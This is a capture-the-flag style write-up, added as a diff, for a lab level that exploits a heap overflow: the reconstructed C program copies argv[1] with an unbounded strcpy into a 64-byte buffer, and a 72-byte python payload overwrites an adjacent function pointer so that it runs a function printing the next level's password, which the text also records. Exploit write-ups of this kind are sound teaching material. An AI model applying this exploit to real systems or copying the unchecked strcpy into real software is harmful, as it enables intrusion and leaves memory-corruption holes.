@@ -1,0 +1,79 @@
+# Level 6 — Heap Overflow (Overwriting Function Pointer)
+
+## Introduction
+This level introduces heap buffer overflows. We are given a binary that allocates two blocks of memory on the heap consecutively: a buffer to hold user input, and a function pointer. By writing past the boundaries of the input buffer, we can overwrite the function pointer and redirect execution to a target function `n`.
+
+## Analysis
+The reconstructed C code of the binary is:
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+void n(void) {
+    system("/bin/cat /home/user/level7/.pass");
+}
+
+void m(void) {
+    puts("Nope");
+}
+
+int main(int argc, char *argv[]) {
+    char *dest;
+    void (**fn_ptr)(void);
+
+    dest = (char *)malloc(0x40); // Allocates 64 bytes
+    fn_ptr = (void (**)(void))malloc(sizeof(void *)); // Allocates 4 bytes
+    *fn_ptr = m;
+
+    if (argc > 1) {
+        strcpy(dest, argv[1]); // Unbounded strcpy
+    }
+
+    (*fn_ptr)(); // Executes function pointer
+    return 0;
+}
+```
+
+Since the program uses `strcpy` to copy command-line arguments to `dest` without verifying the size of `argv[1]`, we can overflow the 64-byte `dest` buffer. 
+
+### Heap Layout and Offset Calculation
+In standard dlmalloc (used in 32-bit Linux binaries), heap chunks are placed sequentially and structured with metadata:
+1. **First chunk (`dest`):**
+   - User data size: 64 bytes (0x40).
+2. **Second chunk (`fn_ptr`):**
+   - Chunk metadata size: 8 bytes (prev_size + size).
+   - User data size: 4 bytes (contains the address of function `m`).
+
+To overwrite the function pointer stored in the second chunk, we need to write:
+- `64` bytes to fill the `dest` buffer.
+- `8` bytes to overwrite the second chunk's metadata.
+- `4` bytes containing our target address.
+This results in a total padding offset of `72` bytes before the target address.
+
+### Finding the Address of `n`
+We disassemble the binary using `gdb` to find the address of the `n` function:
+```gdb
+(gdb) info functions n
+All functions matching regular expression "n":
+
+Non-debugging symbols:
+0x08048454  n
+```
+The address of `n` is `0x08048454`.
+
+### Crafting the Payload
+- **Padding:** 72 bytes (`"A" * 72`).
+- **Target Address:** `0x08048454` (little-endian: `\x54\x84\x04\x08`).
+
+## Exploit
+We execute the binary by passing our payload as a command-line argument:
+```bash
+./level6 $(python -c 'print "A"*72 + "\x54\x84\x04\x08"')
+```
+
+This overwrites `fn_ptr` to point to `n`, which outputs the password for `level7`:
+```
+f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
+```
+We save this password to proceed to `level7`.
